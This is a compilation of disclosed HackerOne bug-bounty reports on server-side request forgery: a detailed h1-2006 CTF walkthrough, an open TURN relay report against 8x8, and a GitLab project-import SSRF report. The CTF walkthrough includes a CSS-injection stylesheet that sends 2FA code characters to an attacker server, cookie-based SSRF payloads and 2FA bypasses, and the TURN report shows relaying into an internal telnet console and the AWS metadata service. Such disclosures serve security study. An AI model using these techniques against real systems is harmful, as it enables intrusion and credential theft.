^FLAG^736c635d8842751b8aafa556154eb9f3$FLAG$

Kind regards,
Alex - hackingfish


Attached:

A screenshot of the site which is showing the flag

## Impact

.

---

### [[h1-2006 2020] CTF Walkthrough](https://hackerone.com/reports/895780)

- **Report ID:** `895780`
- **Severity:** Critical
- **Weakness:** Server-Side Request Forgery (SSRF)
- **Program:** h1-ctf
- **Reporter:** @meraxes
- **Bounty:** - usd
- **Disclosed:** 2020-06-18T01:03:57.468Z
- **CVE(s):** -

**Vulnerability Information:**

# h1-2006-ctf Writeup
## June 2020
https://hackerone.com/h1-ctf/


# The Competition Begins!
The tweet announces the CTF challenge. Looks like we will need to find a way to process some payments.

{F863442}

# Initial Exploring
Reading up on the extended description at https://hackerone.com/h1-ctf/ reveals that the target of this competition are the domains within `*.bountypay.h1ctf.com`. 

Scanning for available subdomains revealed:
- https://bountypay.h1ctf.com
- https://app.bountypay.h1ctf.com
- https://www.bountypay.h1ctf.com
- https://staff.bountypay.h1ctf.com
- https://api.bountypay.h1ctf.com
- https://software.bountypay.h1ctf.com

The description also mentioned that we should keep a look out on the HackerOne twitter for clues. I took a closer look through their feed.

{F863436}

Right away, this particular retweet stood out:

{F863451}

Viewing their profile shows:

{F863432}

I wonder who they are following?

{F863438}

Sandra has a very interesting tweet!

{F863439}

Zoom, enhance! Her staff ID is clearly visible in this tweet. `STF:8FJ3KFISL3`. Thanks, Sandra, this should come in handy later. 

Scanning the barcode didn't seem to reveal anything. Best to move on for now and to look at the sites.

# Beginning the Journey
First things first, https://bountypay.h1ctf.com/.

The main site is pretty uneventful, just a splash screen with two external login pages, and some tumbleweeds.

The customer login is hosted on https://app.bountypay.h1ctf.com/, and the staff login is on https://staff.bountypay.h1ctf.com/.

The login pages were sanitized against SQL injection, and there was no way to create a new account. 

Well, maybe we need to explore some more.

{F863441}

# Fuzz Faster U Fool
Time to do some directory bruteforcing to see if anything is available other than the login pages. I scanned for directories on the `app` domain.

```yaml
css                     [Status: 301, Size: 194, Words: 7, Lines: 8]
images                  [Status: 301, Size: 194, Words: 7, Lines: 8]
js                      [Status: 301, Size: 194, Words: 7, Lines: 8] 
logout                  [Status: 302, Size: 0, Words: 1, Lines: 1] 
.                       [Status: 301, Size: 194, Words: 7, Lines: 8]                  
.git                    [Status: 403, Size: 170, Words: 5, Lines: 7] 
cgit                    [Status: 403, Size: 170, Words: 5, Lines: 7]
```

That `.git` is very interesting. Trying to `GET` it returned a 403, but what about it's contents? 

I tried going to `/.git/config` in my browser, and it started downloading.

{F863457}

# Finding a Way In

Let's see that git config up close:
```yaml
[core]
	repositoryformatversion = 0
	filemode = true
	bare = false
	logallrefupdates = true
[remote "origin"]
	url = https://github.com/bounty-pay-code/request-logger.git
	fetch = +refs/heads/*:refs/remotes/origin/*
[branch "master"]
	remote = origin
	merge = refs/heads/master
```

The GitHub account has one repository with one file in it, `logger.php`.

```php
<?php

$data = array(
  'IP'        =>  $_SERVER["REMOTE_ADDR"],
  'URI'       =>  $_SERVER["REQUEST_URI"],
  'METHOD'    =>  $_SERVER["REQUEST_METHOD"],
  'PARAMS'    =>  array(
      'GET'   =>  $_GET,
      'POST'  =>  $_POST
  )
);

file_put_contents('bp_web_trace.log', date("U").':'.base64_encode(json_encode($data))."\n",FILE_APPEND   );
```

Looks like they are logging their site activity to `bp_web_trace.log`. Let's grab that file off of `app`.

```
1588931909:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJHRVQiLCJQQVJBTVMiOnsiR0VUIjpbXSwiUE9TVCI6W119fQ==
1588931919:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJQT1NUIiwiUEFSQU1TIjp7IkdFVCI6W10sIlBPU1QiOnsidXNlcm5hbWUiOiJicmlhbi5vbGl2ZXIiLCJwYXNzd29yZCI6IlY3aDBpbnpYIn19fQ==
1588931928:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJQT1NUIiwiUEFSQU1TIjp7IkdFVCI6W10sIlBPU1QiOnsidXNlcm5hbWUiOiJicmlhbi5vbGl2ZXIiLCJwYXNzd29yZCI6IlY3aDBpbnpYIiwiY2hhbGxlbmdlX2Fuc3dlciI6ImJEODNKazI3ZFEifX19
1588931945:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC9zdGF0ZW1lbnRzIiwiTUVUSE9EIjoiR0VUIiwiUEFSQU1TIjp7IkdFVCI6eyJtb250aCI6IjA0IiwieWVhciI6IjIwMjAifSwiUE9TVCI6W119fQ==
```

Decoding the base64 entries shows:
```json
{"IP":"192.168.1.1","URI":"\/","METHOD":"GET","PARAMS":{"GET":[],"POST":[]}}
{"IP":"192.168.1.1","URI":"\/","METHOD":"POST","PARAMS":{"GET":[],"POST":{"username":"brian.oliver","password":"V7h0inzX"}}}
{"IP":"192.168.1.1","URI":"\/","METHOD":"POST","PARAMS":{"GET":[],"POST":{"username":"brian.oliver","password":"V7h0inzX","challenge_answer":"bD83Jk27dQ"}}}
{"IP":"192.168.1.1","URI":"\/statements","METHOD":"GET","PARAMS":{"GET":{"month":"04","year":"2020"},"POST":[]}}
```

Great, we've got our username and password. Let's login to `app`.

# Trying the Door

{F863433}

Should be smooth sailing. Only it looks like they have one more security step...

{F863425}

Trying the code from the log didn't work, these codes are generated new every time.

Here, I used one of my favourite Burp Suite features, `Prominently highlight hidden fields`.

{F863430}

That is prominent enough for me. Looks like the frontend sends the backend both the challenge and the challenge answer. I can just set both to whatever I want. 

The challenge looks like an MD5 hash. I made up my own challenge answer, generated the hash of it, and then sent both. 

{F863428}

Login successful.

# Looking For Greener Grass

{F863435}

Well. Turns out our friend Brian Oliver kind of sucks. Loading all the statements from all the months and years that the UI provides (and the additional months and years that the backend supports but the UI doesn't show) turns up nothing. 

Looking around a bit, I was curious if I could gather any information from the cookie. The cookie was set to:
`eyJhY2NvdW50X2lkIjoiRjhnSGlxU2RwSyIsImhhc2giOiJkZTIzNWJmZmQyM2RmNjk5NWFkNGUwOTMwYmFhYzFhMiJ9`. 

Decoding the base64 string returns: `{"account_id":"F8gHiqSdpK","hash":"de235bffd23df6995ad4e0930baac1a2"}`.

I also noticed that every time I clicked to `Load Transactions`, it would fire off a request like:
`https://api.bountypay.h1ctf.com/api/accounts/F8gHiqSdpK/statements?month=01&year=2020`. 

It is interesting that the account id of my cookie also appears in this URL. From experimenting, I could see that editing the cookie to change the account id also changes the API request. We could potentially use an account id here that triggers a different endpoint.

## Investigating Possibilities of the API Domain
To exploit the api, we need to understand api. Going to `api.bountypay.h1ctf.com` shows:

{F863431}

The link is a cheeky redirect to google search what a rest api is. (https://api.bountypay.h1ctf.com/redirect?url=https://www.google.com/search?q=REST+API). Cheeky as it may be, this is an open redirect that we could make use of to perform a SSRF.

Exploring the endpoints from the browser (e.g. navigating to https://api.bountypay.h1ctf.com/api/accounts/F8gHiqSdpK), just returns `["Missing or invalid Token"]`. Looks like the main page with the redirect is all we have access to for now.

## Finding Our Target
The software domain looks like a likely target for a SSRF. It was rudely refusing access altogether due to our IP. 

{F863453}

## Performing the Attack
It is time to do some SSRF.

I set the cookie to the base64 encoded version of 
```json
{
    "account_id":"../../redirect?url=https://software.bountypay.h1ctf.com/&disregard=",
    "hash":"de235bffd23df6995ad4e0930baac1a2"
}
```

The `../` characters navigate us to the base api endpoint in order to use the `/redirect` path. 

I had to use the `&disregard=` at the end in order to make the browser **not** interpret the rest of the imposed url (`/statements?month=01&year=2020"`) to mean "use the `/statements` endpoint".

The final URL looks like: `https://api.bountypay.h1ctf.com/api/accounts/../../redirect?url=https://software.bountypay.h1ctf.com/&disregard=/statements?month=01&year=2020`

With this request we are able to connect to the `software` domain and see...another login page. At least this time we are able to access it instead of just being given a 401.

# These Are the Droids You Are Looking For
I scanned to see what directories are available on the `software` domain without being logged in.

```json
{
    "account_id": "../../redirect?url=https://software.bountypay.h1ctf.com/FUZZ&disregard=",
    "hash": "de235bffd23df6995ad4e0930baac1a2"
}
```

It turned up a folder, `uploads`. This page was a directory listing containing a file `BountyPay.apk`. Navigating my browser to https://software.bountypay.h1ctf.com/uploads/BountyPay.apk downloaded the application.

# Dreaming of Electric Sheep
{F863445}

Loading the application lets us put in a username and twitter name, and then it displays a blank page. Well, okay. Perhaps if we decompile the source code we can find something interesting.

{F863449}

The code is split into:

- `PartOneActivity.java`
- `PartTwoActivity.java`
- `PartThreeActivity.java`

## PartOneActivity
The blank screen we saw earlier was the first activity in the list. Looking at the source code, I found the trigger for starting the second activity:

```java
String firstParam = getIntent().getData().getQueryParameter("start");
if (firstParam != null && firstParam.equals("PartTwoActivity") && settings.contains(str)) {
    String str2 = "";
    String user = settings.getString(str, str2);
    Editor editor = settings.edit();
    String twitterhandle = settings.getString("TWITTERHANDLE", str2);
    editor.putString("PARTONE", "COMPLETE").apply();
    logFlagFound(user, twitterhandle);
    startActivity(new Intent(this, PartTwoActivity.class));
}
```

Intents are messages instructing that you want an action to be be performed. This includes launching activities (screens of the app).

From the code it looks like we can slide into part 2 if we just launch part one with the proper parameters (`PartTwoActivity` = `start`). We can launch customized intents with the debugger program, ADB:

```bash
generic_x86_arm:/ $ am start -n "bounty.pay/bounty.pay.PartOneActivity" -a android.intent.action.VIEW -d one://part?start=PartTwoActivity
Starting: Intent { act=android.intent.action.VIEW dat=one://part?start=PartTwoActivity cmp=bounty.pay/.PartOneActivity }
```

This immediately triggers part 2, which welcomes us with...another blank screen.

## PartTwoActivtiy
The first thing to stand out in the code was this snippet:

```java
Uri data = getIntent().getData();
String firstParam = data.getQueryParameter("two");
String secondParam = data.getQueryParameter("switch");
if (firstParam != null && firstParam.equals("light") && secondParam != null && secondParam.equals("on")) {
    editText.setVisibility(0);
    button.setVisibility(0);
    textview.setVisibility(0);
}
```

There are several components that become visible with the right intent parameters.

Launching with ADB:
```bash
generic_x86_arm:/ $ am start -n "bounty.pay/bounty.pay.PartTwoActivity" -a android.intent.action.VIEW -d two://part?two=light\&switch=on
```

The lights are on now!

{F863444}

Inputting the string into the `Header value` box didn't do anything. 

The string looks like an MD5 hash. Decrypting it uncovers an original value of `Token`. Still, inputting `Token` would not move to the next section. Hmm, time to inspect more of the code.

The button click listener was performing this logic:

```java
String value = (String) dataSnapshot.getValue();
SharedPreferences settings = PartTwoActivity.this.getSharedPreferences(PartTwoActivity.KEY_USERNAME, 0);
Editor editor = settings.edit();
String str = post;
StringBuilder sb = new StringBuilder();
sb.append("X-");
sb.append(value);
if (str.equals(sb.toString())) {
    String str2 = "";
    PartTwoActivity.this.logFlagFound(settings.getString("USERNAME", str2), settings.getString("TWITTERHANDLE", str2));
    editor.putString("PARTTWO", "COMPLETE").apply();
    PartTwoActivity.this.correctHeader();
    return;
}
Toast.makeText(PartTwoActivity.this, "Try again! :D", 0).show();
```

Well, looks like we need to have a `X-` prefix to the value that goes in. Inputting `X-Token` gets us through to part 3.

## PartThreeActivity
Blank screens don't phase me anymore, let's dive into the code.

```java
Uri data = getIntent().getData();
String firstParam = data.getQueryParameter("three");
String secondParam = data.getQueryParameter("switch");
String thirdParam = data.getQueryParameter("header");
byte[] decodeFirstParam = Base64.decode(firstParam, 0);
byte[] decodeSecondParam = Base64.decode(secondParam, 0);
final String decodedFirstParam = new String(decodeFirstParam, StandardCharsets.UTF_8);
final String decodedSecondParam = new String(decodeSecondParam, StandardCharsets.UTF_8);
```

Ok, three parameters. We need to send in the first two base64 encoded this time.

```java
String value = (String) dataSnapshot.getValue();
if (str != null && decodedFirstParam.equals("PartThreeActivity") && str2 != null && decodedSecondParam.equals("on")) {
    String str = secondParam2;
    if (str != null) {
        StringBuilder sb = new StringBuilder();
        sb.append("X-");
        sb.append(value);
        if (str.equals(sb.toString())) {
            editText2.setVisibility(0);
            button2.setVisibility(0);
            PartThreeActivity.this.thread.start();
        }
    }
}
```

And sending in the correct parameters will once again make some items visible. It also starts a thread, but we can come back to that.

Remembering to base64 the first two parameter values (`PartThreeActivity`, `on`), we can turn on the lights for the second time today:

```bash
am start -n "bounty.pay/bounty.pay.PartThreeActivity" -a android.intent.action.VIEW -d three://part?three=UGFydFRocmVlQWN0aXZpdHk\=\&switch=b24\=\&header=X-Token
```

{F863446}

One more input box that we need to fill with the correct value. Let's take a closer look now at what that thread was that we started:

```java
this.thread = new Thread(new Runnable() {
public void run() {
    PartThreeActivity.this.performPostCall(PartThreeActivity.this.getSharedPreferences(PartThreeActivity.KEY_USERNAME, 0).getString("TOKEN", ""));
}
});
```

It performs a POST call when we use the right arguments. Let's see if we can intercept this to find the answer to this section.

I managed to find a particular message sent from the app that caught my attention!

```json
{
    "t": "d",
    "d": {
        "b": {
            "p": "X-Token",
            "d": "8e9998ee3137ca9ade8f372739f062c1"
        },
        "a": "d"
    }
}
```

The X-Token makes an appearance! Submitting it gets us clear to the end of the stage.

{F863434}

We should be able to use this X-Token to authenticate with the BountyPay API.

# Rummaging Through API
I tried again to load the accounts endpoint from before, but this time sending the X-Token as a header.

https://api.bountypay.h1ctf.com/api/accounts/F8gHiqSdpK

This time I got back:
```json
{
    "account_id": "F8gHiqSdpK",
    "owner": "Mr Brian Oliver",
    "company": "BountyPay Demo "
}
```

We're in! Once again, time to scan to see what endpoints are available other than `accounts`.

Some directory bruteforcing came up with this endpoint: https://api.bountypay.h1ctf.com/api/staff/

Doing a GET request got back:
```json
[
    {
        "name": "Sam Jenkins",
        "staff_id": "STF:84DJKEIP38"
    },
    {
        "name": "Brian Oliver",
        "staff_id": "STF:KE624RQ2T9"
    }
]
```

We know about Brian, and his lack of access to useful statements. Sam Jenkins is a newcomer, but we don't have a way to access his login information. 

I tried to send a POST request to create a staff account for myself. The api helpfully let me know that I needed to provide a `staff_id`, and `name`. Still, no matter what I put, the api would say the `staff_id` was invalid.

Looking at the two staff members again, I noticed that our social media guru, Sandra, was not there. I suppose she hasn't started work yet, and they haven't set up her account. Maybe we can push her start date up a bit and make her account for her.

{F863455}

Welcome to the team, Sandra!

# Masquerading As Sandra
{F863440}

Using my newfound identity, I went over to https://staff.bountypay.h1ctf.com.

{F863456}

After looking around a bit, I realized that even though Sandra is a staff member, she is not an admin, and some site content remained hidden. Maybe we can find a way to boost the account into being one.

The site has a report feature where you can tell the admins about an issue with a page. 

{F863450}

Clicking the button sends a base64 encoded string of the URL of the current page you are on. The wording that the admins will look at the page makes me think that we can design a malicious page that promotes us to admin when viewed by an admin.

There was a file, `website.js` that piqued my interest. Looking at it, function by function:
```javascript
$('.upgradeToAdmin').click(function () {
	let t = $('input[name="username"]').val();
	$.get('/admin/upgrade?username=' + t, function () {
		alert('User Upgraded to Admin');
	});
}), 
```
Well, this is interesting! Looks like there is a button to upgrade users to administrators. This button doesn't appear anywhere on my UI, looks as though you have to be an admin to see it. This does reveal though what endpoint you have to hit to get the functionality. 

Trying `/admin/upgrade?username=sandra.allison` manually just returned an error saying I didn't have permission to do this. Reporting this URL didn't change anything. (The prompt did say any reports in the `/admin` directory would be ignored.) They even were filtering out obfuscating the path by doing things like `/pls-let-me-in/../admin/upgrade?username=sandra.allison`. Let's look at what else is in `website.js` for now.

```javascript
$('.tab').click(function () {
	return $('.tab').removeClass('active'), $(this).addClass('active'), $('div.content').addClass('hidden'), $('div.content-' + $(this).attr('data-target')).removeClass('hidden'), !1;
}), 
```
This powers the tab buttons on the site. When you click a tab it will hide the current site content and unhide the content related to the current tab. Not too interesting.

```javascript
$('.sendReport').click(function () {
	$.get('/admin/report?url=' + url, function () {
		alert('Report sent to admin team');
	}), $('#myModal').modal('hide');
}), 
```
We see the logic for the report sending here. It shows the URL for reporting urls here. We can just call `/admin/report?url=` directly now.

```javascript
document.location.hash.length > 0 && 
    (
        '#tab1' === document.location.hash && $('.tab1').trigger('click'), 
        '#tab2' === document.location.hash && $('.tab2').trigger('click'), 
        '#tab3' === document.location.hash && $('.tab3').trigger('click'), 
        '#tab4' === document.location.hash && $('.tab4').trigger('click')
    );
```
This is the handling for anchor hashes. For example if I go to https://staff.bountypay.h1ctf.com#tab2, it will automatically click the second tab for me. This might come in handy later.

I noticed also that the code talks about a tab4, but our UI does not have a 4th tab. Trying to go to it doesn't work. I'm assuming that there is one more tab that only the admins have access to.

## Profile Shenanigans
The first thing to really stand out was the profile updater tool. 

{F863448}

I tried updating my username to different values to try and check for XSS. No luck, both inputs are being sanitized, and symbols are not allowed.

By intercepting the request, I was able to see the the radio buttons allowed me to change the avatar between the values: `avatar`, `avatar1`, `avatar2`, `avatar3`.

The avatar value gets inserted into a div like this:
```html
<div style="margin:auto" class="avatar1"></div>
```

And then the CSS adds the image to the div (urls removed by me to save space):
```css
.avatar {
    width:64px;
    height:64px;
}
.avatar1 {
    background-image:url("");
}
.avatar2 {
    background-image:url("");
}
.avatar3 {
    background-image:url("");
}
```

We are limited to only using regular letters and number characters as our input. That should be enough to do some damage though, as we are able to write class names right into the page, and we know `website.js` will run functionality on elements with certain class names.

The most obvious contender for classname is `upgradeToAdmin`. To refresh our memory, here is the function from `website.js` again below:
```javascript
$('.upgradeToAdmin').click(function () {
	let t = $('input[name="username"]').val();
	$.get('/admin/upgrade?username=' + t, function () {
		alert('User Upgraded to Admin');
	});
}), 
```

With the class set, the page renders with a div looking like this:
```html
<div style="margin:auto" class="upgradeToAdmin"></div>
```

And now, when I click on our avatar, I can see a request being made to `https://staff.bountypay.h1ctf.com/admin/upgrade?username=undefined`. We'll need to come back to the username being undefined, but this is a promising start!

Having the admin need to click the avatar to run the exploit is not good enough though. We will want it to happen automatically as soon as the page is opened.

There is some other functionality related to clicking, which I will paste again below:
```javascript
document.location.hash.length > 0 && 
    (
        '#tab1' === document.location.hash && $('.tab1').trigger('click'), 
        '#tab2' === document.location.hash && $('.tab2').trigger('click'), 
        '#tab3' === document.location.hash && $('.tab3').trigger('click'), 
        '#tab4' === document.location.hash && $('.tab4').trigger('click')
    );
```

Ok. If we give our image a specific tab class, and then go to a url with an anchor hash of the same value, we can get our avatar to be auto clicked.

One more profile update, and we have:

```html
<div style="margin:auto" class="upgradeToAdmin tab3"></div>
```

Now, when we navigate to https://staff.bountypay.h1ctf.com?template=home#tab3, we are brought directly to the profile tab, and we instantly have a request made in the background to `https://staff.bountypay.h1ctf.com/admin/upgrade?username=undefined`.

Now we are cooking.

## Getting the Username
One thing is still outstanding though. We need to make sure our page sends our username, `sandra.allison`. The code in the `upgradeToAdmin` function is sending the value of `input[name="username"]` as the username. None of the tabs have an input box with that name. 

There is, however, an input box with that name on the login page. If we could render the login template at the same time as the profile template (containing our avatar), we could have the request send properly.

The typical URL looks like `?template=VALUE` where value is one of `login`, `home`, `ticket`, or `admin` (and we don't have access to admin). We can send in an array of templates by forming our URL like `?template[]=home&template[]=login`.

Putting everything together, we get: https://staff.bountypay.h1ctf.com/?template[]=login&username=sandra.allison&template[]=ticket&ticket_id=3582#tab3

We need the login template to have access to the username field, the ticket template to have access to our avatar (from the admin's point of view), and the tab in order to trigger our click.

I directly reported this URL to `/admin/report?url=`, base64 encoded. Now, when refreshing the page, we can see our unlimited administrator powers!

# Unlimited Administrator Powers
{F863429}

Marten Mickos, the account we need to access to pay the bounties! Let's log into the app domain and see if we can find some statements.

Logging in gives us another 2 factor challenge.

{F863425}

Pff, easy, just look at the hidden fields, make my own challenge and answer, we've done this before.

Once more, we are greeted with the dashboard of no statements. I iterated through all possible year / month combinations until 05-2020 revealed some transactions. 

{F863447}

Clicking to pay brings up another 2 factor challenge.

{F863427}

It is weird that we are able to send a css stylesheet to the 2 factor app. Let's go next and see what happens.

{F863426}

Our usual party trick of manually setting the challenge and answer doesn't work this time! Looks like this works completely differently. It is also interesting that we have a timeout now, and have to complete the challenge within 2 minutes.

# Attacking With a Stylesheet
After some looking around, it seems like our only weapon for this final battle is a CSS stylesheet. The default stylesheet didn't contain any useful information.

I did some Google searching to see what kind of stylish attacks could be pulled off with nothing but CSS. This reference was a big help: https://www.mike-gualtieri.com/posts/stealing-data-with-css-attack-and-defense.

The gist of it is, you can determine what content is on a page by applying a style to it, and sending a network request as part of the style. We can assume that the 2 factor code is displayed in an `input` type element for easy selecting by the user.

As a little test, we could create an HTML file:
```html
<input value="secret">
```

and a CSS file:
```css
input[value="^s"] { background-image: url("<my-server>/s"); }
```

This style applies to all input elements that have a value beginning with `s`. When we open the HTML file, the server will receive a request for `s`. It won't know what to do with that request, but that doesn't matter. We received a piece of information that the input begins with `s`. The blog post goes into a lot of detail into how to create a css file that can go through all the permutations needed to work out the full input. Let's move on for now, back to the challenge at hand.

I generated a stylesheet looking like this to find out what the 2 factor code started with:
```css
input[value^="1"] { background-image: url("<my-server>/1"); }
input[value^="2"] { background-image: url("<my-server>/2"); }
input[value^="3"] { background-image: url("<my-server>/3"); }
...
input[value^="A"] { background-image: url("<my-server>/A"); }
input[value^="B"] { background-image: url("<my-server>/B"); }
input[value^="C"] { background-image: url("<my-server>/C"); }
...
input[value^="d"] { background-image: url("<my-server>/d"); }
input[value^="e"] { background-image: url("<my-server>/e"); }
input[value^="f"] { background-image: url("<my-server>/f"); }
...
input[value^="!"] { background-image: url("<my-server>/!"); }
input[value^="@"] { background-image: url("<my-server>/@"); }
input[value^="#"] { background-image: url("<my-server>/#"); }
...
```

After submitting my stylesheet, I got some pings on my server!

{F863452}

7 different responses. Note that if multiple styles apply to an object, only the last one gets used. That means that if I got 7 responses, there are 7 different input boxes on the page.

I wrote a quick python script to generate all the permutations of those 7 characters:
```python
from itertools import permutations

file = open('payloads.txt', 'a')
alphabet = 'QKDCux5'
for perm in permutations(alphabet, len(alphabet)):
    file.write(f'{"".join(perm)}\n')
file.close()
```

We have our wordlist now, next thing to do is to hammer the server with these thousands of requests before the time limit is up! 

{F863460}

And that's a wrap!

{F863454}

## Impact

Attacker can:
- view user passwords
- gain access to an internal domain, and download files from it
- get through all the screens of the android app
- create a staff user
- escalate a staff user to admin
- bypass two different implementations of 2 factor authentication

---

### [Open TURN relay abuse is possible due to lack of peer access control (Critical)](https://hackerone.com/reports/843256)

- **Report ID:** `843256`
- **Severity:** High
- **Weakness:** Server-Side Request Forgery (SSRF)
- **Program:** 8x8
- **Reporter:** @sandrogauci
- **Bounty:** 700 usd
- **Disclosed:** 2020-06-08T21:36:26.131Z
- **CVE(s):** -

**Vulnerability Information:**

> NOTE: This is not an SSRF vulnerability but an open TURN relay vulnerability. Typically, this security vulnerability has at least the same impact as an SSRF. However it is considered more useful from an attacker's point of view since attacks are not restricted to HTTP.

- Affects: 
    - `█████:443`
    - `████████:443`

## Description

The affected TURN server did not put any restrictions on peer which allows remote attackers to bypass firewall rules and reach internal services on the server itself as well as the AWS internal network. In the case of `██████████:443`, both TCP and UDP peers could be specified, while `███████:443` appeared to restrict TCP and only allow UDP.

## Steps To Reproduce:

1. Retrieved temporary TURN credentials from XMPP by:
    - making use of Chrome's devtools 
    - open the network tab, filter just WS connections
    - in the `xmpp-websocket` messages, set a filter for `type='turn'`
    - observe the TURN hostname and credentials
2. Made use of an internal tool called `stunner` as follows: `stunner recon tls://███████:443 -u ████████`
3. Made use of stunner's port scanner and socks proxy to reach the telnet server, AWS meta-data service and so on

Note that we restricted our tests to just the following to avoid causing denial of service to the system:

- Read access to AWS meta-data service
- Only running `help` and `pc` commands on coturn telnet server (other commands may be destructive)

The following is an excerpt from the connection to the coturn telnet server:


```
proxychains -f config telnet 127.0.0.1 5766
[proxychains] config file found: config
[proxychains] preloading /usr/lib64/proxychains-ng/libproxychains4.so
[proxychains] DLL init: proxychains-ng 4.13
Trying 127.0.0.1...
[proxychains] Dynamic chain  ...  127.0.0.1:9999  ...  127.0.0.1:5766  ...  OK
Connected to 127.0.0.1.
Escape character is '^]'.

> pc

  verbose: ON
  daemon process: ON
  stale-nonce: ON (*)
  stun-only: OFF (*)
  no-stun: OFF (*)
  secure-stun: OFF (*)
  do-not-use-config-file: OFF
  RFC5780 support: ON
  net engine version: 3
  net engine: UDP thread per CPU core
  enforce fingerprints: OFF
  mobility: OFF (*)
  udp-self-balance: OFF
  pidfile: /var/run/turnserver.pid
  process user ID: 0
  process group ID: 0
  process dir: /

  cipher-list: DEFAULT
  ec-curve-name: empty
  DH-key-length: 1066
  Certificate Authority file: empty
  Certificate file: /████████.crt
  Private Key file: /███.key
  Listener addr: 127.0.0.1
  Listener addr: ██████
  Listener addr: ::1
  Listener addr: ███████
  no-udp: OFF
  no-tcp: OFF
  no-dtls: OFF
  no-tls: OFF
  TLSv1.0: ON
    TLSv1.1: ON
  TLSv1.2: ON
  listener-port: 443
  tls-listener-port: 5349
  alt-listener-port: 0
  alt-tls-listener-port: 0


  Relay addr: █████
  Relay addr: ██████████
  server-relay: OFF
  no-udp-relay: OFF (*)
  no-tcp-relay: OFF (*)
  min-port: 49152
  max-port: 65535
  no-multicast-peers: OFF (*)
  no-loopback-peers: OFF (*)

  DB type: SQLite
  DB: /var/lib/turn/turndb

  Default realm: █████
  CLI session realm: █████
...

> q
```

## Supporting Material/References:

- Similar vulnerability: <https://www.rtcsec.com/2020/04/01-slack-webrtc-turn-compromise>

## Impact

Abuse of this vulnerability allows attackers to:

- control Coturn by connecting to the telnet server on port 5766 which in turn, allows for writing of files on disk (e.g. using `psd` command), display and editing of the coturn configuration, stopping the server
- connecting to the AWS meta-data service and retrieving IAM credentials for user `HipChatVideo-Coturn`, viewing user-data configuration etc
- scanning `127.0.0.1` and internal network on `██████` and connecting to internal services

Note that in the case of `██████████:443`, both TCP and UDP peers can be specified, while `███:443` appeared to be restricted to just UDP which somewhat limits the security impact of this vulnerability.

We think that it is likely that abuse of the coturn telnet server could lead to remote code execution on the server and further penetration inside 8x8's infrastructure.

---

### [SSRF on project import via the remote_attachment_url on a Note](https://hackerone.com/reports/826361)

- **Report ID:** `826361`
- **Severity:** High
- **Weakness:** Server-Side Request Forgery (SSRF)
- **Program:** GitLab
- **Reporter:** @vakzz
- **Bounty:** 10000 usd
- **Disclosed:** 2020-06-07T22:41:22.183Z
- **CVE(s):** -

**Vulnerability Information:**

### Summary

The Note model has an `attachment` which is provided by a CarrierWave uploader:

```ruby
mount_uploader :attachment, AttachmentUploader
```

One of the features this provides is the ability to download and attach a file via a url, see https://github.com/carrierwaveuploader/carrierwave/blob/v1.3.1/lib/carrierwave/mount.rb#L80. This means that the Note model has a method `remote_attachment_url=` which can be used to perform this action.

As this attribute isn't removed by the `AttributeCleaner` on project import, it can be set in the `project.json` for a note and will be set when the note is created, downloading the file:

https://github.com/carrierwaveuploader/carrierwave/blob/v1.3.1/lib/carrierwave/mounter.rb#L72
```ruby
  def remote_urls=(urls)
      return if not urls or urls == "" or urls.all?(&:blank?)

      @remote_urls = urls
      @download_error = nil
      @integrity_error = nil

      @uploaders = urls.zip(remote_request_headers || []).map do |url, header|
        uploader = blank_uploader
        uploader.download!(url, header || {})
        uploader
      end
```

https://github.com/carrierwaveuploader/carrierwave/blob/v1.3.1/lib/carrierwave/uploader/download.rb#L43
```ruby
    def file
          if @file.blank?
            headers = @remote_headers.
              reverse_merge('User-Agent' => "CarrierWave/#{CarrierWave::VERSION}")

            @file = Kernel.open(@uri.to_s, headers)
            @file = @file.is_a?(String) ? StringIO.new(@file) : @file
          end
```

The downloaded file is then attached to the note and can be viewed from the newly imported project.

Any model that has a `mount_uploader` and is importable is potentially vulnerable to the same attack, although the majority of the others are `AvatarUploader` which checks the file type and prevents the response from being viewed.

### Steps to reproduce

1. Create a new project
1. Create an issue in the project
1. Add a note to the issue
1. Export the project
1. Extract the export
1. Add  `remote_attachment_url` to the `note` hash with a url
1. Recompress the export and import it
1. View the note on the issue

Demo {F756257}

### Examples

Example of project import on gitlab.com hitting postbin:

https://gitlab.com/wbowling/ssrf1/-/issues/1#note_309127303
{F756269}

### What is the current *bug* behavior?
When importing a model that has a mount_uploader it's possible to use the carrierwave uploader seed attributes to download a file from any host: https://github.com/carrierwaveuploader/carrierwave/wiki/How-to:-Upload-remote-image-urls-to-your-seedfile

### What is the expected *correct* behavior?
The attributes should be prohibited and removed via the `AttributeCleaner`

### Output of checks
This bug happens on gitlab.com

#### Results of GitLab environment info
```
System information
System:		Ubuntu 18.04
Proxy:		no
Current User:	git
Using RVM:	no
Ruby Version:	2.6.5p114
Gem Version:	2.7.10
Bundler Version:1.17.3
Rake Version:	12.3.3
Redis Version:	5.0.7
Git Version:	2.24.1
Sidekiq Version:5.2.7
Go Version:	unknown

GitLab information
Version:	12.8.7-ee
Revision:	2643fd87200
Directory:	/opt/gitlab/embedded/service/gitlab-rails
DB Adapter:	PostgreSQL
DB Version:	10.12
URL:		http://gitlab-vm.local
HTTP Clone URL:	http://gitlab-vm.local/some-group/some-project.git
SSH Clone URL:	git@gitlab-vm.local:some-group/some-project.git
Elasticsearch:	no
Geo:		no
Using LDAP:	no
Using Omniauth:	yes
Omniauth Providers:

GitLab Shell
Version:	11.0.0
Repository storage paths:
- default: 	/var/opt/gitlab/git-data/repositories
GitLab Shell path:		/opt/gitlab/embedded/service/gitlab-shell
Git:		/opt/gitlab/embedded/bin/git
```

## Impact

* Allows an attacker to access internal services, for example the Omnibus GitLab has all of the exporters, Prometheus, Alertmanager exposed on localhost. 
* If GitLab is hosted on AWS it allows for the instance metadata to be accessed.
* Redis is running locally or accessible via tcp (address could be found by looking at the targets in Prometheus at http://localhost:9090/api/v1/targets) it could be possible to obtain RCE (similar to https://github.com/jas502n/gitlab-SSRF-redis-RCE#poc). A POST request is not possible here, but as `remote_attachment_request_header=` is also available (https://github.com/carrierwaveuploader/carrierwave/blob/v1.3.1/lib/carrierwave/mount.rb#L169) and not blacklisted, the payload could be set via a header.
